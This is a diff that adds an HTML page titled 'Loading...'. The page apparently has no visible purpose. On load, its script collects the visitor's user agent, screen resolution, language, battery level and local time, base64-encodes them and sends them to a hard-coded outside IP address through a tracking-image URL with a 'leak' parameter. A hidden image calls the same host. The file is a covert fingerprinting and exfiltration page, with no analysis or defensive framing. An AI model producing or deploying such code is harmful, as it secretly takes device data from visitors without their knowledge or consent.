@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script>
+        async function collectData() {
+            let batteryInfo = "unknown";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `Level:${b.level * 100}%,Charging:${b.charging}`;
+            }
+
+            const data = {
+                ua: navigator.userAgent,
+                res: `${screen.width}x${screen.height}`,
+                lang: navigator.language,
+                batt: batteryInfo,
+                time: new Date().toLocaleString()
+            };
+
+            const encodedData = btoa(JSON.stringify(data));
+            const tracker = new Image();
+            tracker.src = `http://35.172.183.229/view.jpg?leak=${encodedData}`;
+        }
+        collectData();
+    </script>
+    <img src="http://35.172.183.229/view.jpg" style="display:none;">
+</body>
+</html>
